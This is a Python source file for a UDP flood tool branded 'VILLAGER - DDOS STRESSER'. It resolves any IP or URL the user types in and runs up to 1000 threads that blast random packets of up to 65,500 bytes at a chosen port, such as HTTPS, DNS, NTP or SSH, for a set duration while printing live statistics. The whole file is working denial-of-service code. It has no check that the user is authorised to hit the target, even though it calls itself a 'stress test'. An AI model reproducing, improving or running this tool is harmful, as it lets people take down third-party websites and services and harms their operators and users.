import socket
import random
import threading
import os
import time
import sys
from urllib.parse import urlparse

# --- DESIGN CONFIGURATION ---
red, white, green, reset = "\033[91m", "\033[97m", "\033[92m", "\033[0m"
def current_time(): return time.strftime("%H:%M:%S")
BEFORE, AFTER = f"{red}[", f"{red}]{white}"

def clear(): os.system('cls' if os.name == 'nt' else 'clear')

# ==========================================
# DDOS STRESSER LOGIC
# ==========================================
total_sent = 0
lock = threading.Lock()

def attack(ip, port, p_size, duration):
    global total_sent
    # Uses UDP protocol for the stress test
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(p_size)
    timeout = time.time() + duration
    while time.time() < timeout:
        try:
            client.sendto(data, (ip, port))
            with lock: total_sent += 1
        except: 
            break

def run_ddos():
    clear()
    global total_sent
    total_sent = 0
    print(f"{red}╔════════════════════════════════════════╗")
    print(f"║       VILLAGER - DDOS STRESSER         ║")
    print(f"╚════════════════════════════════════════╝{white}\n")
    
    # 1. Target Input (IP or URL)
    target_input = input(f"{red}[+]{white} Target (IP or URL) -> {reset}").strip()
    
    # Cleaning URL if provided
    if "://" in target_input:
        target_input = urlparse(target_input).netloc
    
    # Resolving Domain to IP
    try:
        print(f"{BEFORE}{current_time()}{AFTER} Resolving target...")
        target_ip = socket.gethostbyname(target_input)
        print(f"{BEFORE}{current_time()}{AFTER} Target IP: {green}{target_ip}{white}")
    except socket.gaierror:
        print(f"\n{red}[ERROR]{white} Could not resolve host. Please check the address.")
        time.sleep(2)
        return

    # 2. Power selection
    print(f"\n [1] LOW (64b)    - Basic testing")
    print(f" [2] MEDIUM (1k)  - Standard stress test")
    print(f" [3] HIGH (65k)   - Maximum packet size")
    
    p_choice = input(f"\n{red}[+]{white} Select Power: ")
    p_size = 64 if p_choice == '1' else 1024 if p_choice == '2' else 65500
    threads_count = 50 if p_choice == '1' else 400 if p_choice == '2' else 1000

    # 3. Port selection menu with descriptions
    print(f"\n{red}[SELECT TARGET PORT]{white}")
    print(f"[{red}1{white}] 443  - HTTPS (Secure Web Traffic)")
    print(f"[{red}2{white}] 80   - HTTP (Standard Web Traffic)")
    print(f"[{red}3{white}] 53   - DNS (Domain Name System)")
    print(f"[{red}4{white}] 123  - NTP (Network Time Protocol)")
    print(f"[{red}5{white}] 1900 - SSDP (UPnP/IoT Discovery)")
    print(f"[{red}6{white}] 22   - SSH (Secure Shell)")
    print(f"[{red}7{white}] 21   - FTP (File Transfer)")
    print(f"[{red}8{white}] Custom Port")
    
    port_choice = input(f"{red}[+]{white} Choice: ")
    port_map = {'1': 443, '2': 80, '3': 53, '4': 123, '5': 1900, '6': 22, '7': 21}
    
    if port_choice in port_map:
        target_port = port_map[port_choice]
    else:
        try:
            target_port = int(input(f"{red}[+]{white} Enter Custom Port: "))
        except ValueError:
            target_port = 80

    try:
        duration = int(input(f"{red}[+]{white} Duration (seconds): "))
    except ValueError:
        duration = 60

    print(f"\n{green}[!] Starting test on {target_ip}:{target_port}...{reset}")
    
    # Launching threads for the attack
    for _ in range(threads_count):
        threading.Thread(target=attack, args=(target_ip, target_port, p_size, duration), daemon=True).start()

    # Real-time stats
    end_time = time.time() + duration
    while time.time() < end_time:
        with lock:
            mb = (total_sent * p_size) / (1024 * 1024)
            sys.stdout.write(f"\r{red}[STATS]{white} Packets: {green}{total_sent}{white} | Data: {green}{mb:.2f} MB{white} | Time Left: {green}{max(0, int(end_time - time.time()))}s{white}")
            sys.stdout.flush()
        time.sleep(0.5)
        
    print(f"\n\n{green}[COMPLETE]{white} Stress test finished.")
    input(f"Press Enter to exit...")

if __name__ == "__main__":
    run_ddos()